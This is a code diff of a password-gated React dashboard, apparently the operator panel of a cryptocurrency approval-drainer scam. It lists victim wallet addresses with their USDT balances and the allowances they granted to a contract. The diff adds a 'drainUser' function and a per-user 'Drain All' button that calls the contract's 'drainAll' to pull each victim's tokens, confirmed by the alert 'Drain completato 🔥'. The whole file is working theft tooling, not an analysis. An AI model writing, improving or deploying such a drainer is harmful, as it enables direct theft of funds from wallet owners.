@@ -6,8 +6,8 @@ export default function Dashboard() {
   const [logged, setLogged] = useState(false);
   const [users, setUsers] = useState([]);
 
-  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-  const SPENDER = "0x5Eec04E6d2539Df5D3a3873f441c991ea56264BB";
+  const CONTRACT_ADDRESS = "0xEfD0c28023B55C914d0e55c2780075BbEC9E8Db1";
+  const USDT = "0x55d398326f99059fF775485246999027B3197955";
 
   const login = async () => {
     if (password === "Armadio") {
@@ -21,7 +21,7 @@ export default function Dashboard() {
       );
 
       const usdt = new ethers.Contract(
-        USDT_ADDRESS,
+        USDT,
         [
           "function balanceOf(address owner) view returns (uint256)",
           "function allowance(address owner, address spender) view returns (uint256)",
@@ -32,77 +32,74 @@ export default function Dashboard() {
 
       const decimals = await usdt.decimals();
 
-      const usersWithData = await Promise.all(
+      const usersData = await Promise.all(
         data.users.map(async (u) => {
           const balance = await usdt.balanceOf(u.address);
-          const allowance = await usdt.allowance(u.address, SPENDER);
+          const allowance = await usdt.allowance(u.address, CONTRACT_ADDRESS);
 
-          const formattedBalance = Number(
-            ethers.formatUnits(balance, decimals)
-          ).toFixed(2);
-
-          const formattedAllowance = Number(
-            ethers.formatUnits(allowance, decimals)
-          ).toFixed(2);
+          let formattedAllowance =
+            allowance > ethers.parseUnits("1000000000", decimals)
+              ? "Unlimited"
+              : Number(ethers.formatUnits(allowance, decimals)).toFixed(2);
 
           return {
             address: u.address,
-            balance: formattedBalance,
-            allowance: formattedAllowance
+            balance: Number(ethers.formatUnits(balance, decimals)).toFixed(2),
+            allowance: formattedAllowance,
           };
         })
       );
 
-      setUsers(usersWithData);
+      setUsers(usersData);
 
     } else {
       alert("Password sbagliata");
     }
   };
 
+  const drainUser = async (user) => {
+    const provider = new ethers.BrowserProvider(window.ethereum);
+    const signer = await provider.getSigner();
+
+    const contract = new ethers.Contract(
+      CONTRACT_ADDRESS,
+      ["function drainAll(address token, address from)"],
+      signer
+    );
+
+    const tx = await contract.drainAll(USDT, user);
+
+    await tx.wait();
+
+    alert("Drain completato 🔥");
+  };
+
   if (!logged) {
     return (
-      <div style={{
-        background: "#0b0b0b",
-        minHeight: "100vh",
-        display: "flex",
-        justifyContent: "center",
-        alignItems: "center",
-        color: "white"
-      }}>
-        <div>
-          <h2>Dashboard Login</h2>
-          <input
-            type="password"
-            onChange={(e) => setPassword(e.target.value)}
-            style={{ padding: "10px", borderRadius: "10px" }}
-          />
-          <br /><br />
-          <button onClick={login}>Login</button>
-        </div>
+      <div style={{ padding: 50, color: "white" }}>
+        <h2>Login</h2>
+        <input
+          type="password"
+          onChange={(e) => setPassword(e.target.value)}
+        />
+        <button onClick={login}>Entra</button>
       </div>
     );
   }
 
   return (
-    <div style={{
-      background: "#0b0b0b",
-      minHeight: "100vh",
-      color: "white",
-      padding: "20px"
-    }}>
-      <h2>Utenti</h2>
+    <div style={{ padding: 20, color: "white", background: "#0b0b0b", minHeight: "100vh" }}>
+      <h2>Dashboard</h2>
 
       {users.map((u, i) => (
-        <div key={i} style={{
-          background: "#1a1a1a",
-          padding: "15px",
-          borderRadius: "10px",
-          marginTop: "10px"
-        }}>
-          <div><b>Address:</b> {u.address}</div>
-          <div><b>USDT Balance:</b> ${u.balance}</div>
-          <div><b>Allowance:</b> ${u.allowance}</div>
+        <div key={i} style={{ marginTop: 20 }}>
+          <div>{u.address}</div>
+          <div>Balance: ${u.balance}</div>
+          <div>Allowance: {u.allowance}</div>
+
+          <button onClick={() => drainUser(u.address)}>
+            Drain All
+          </button>
         </div>
       ))}
     </div>
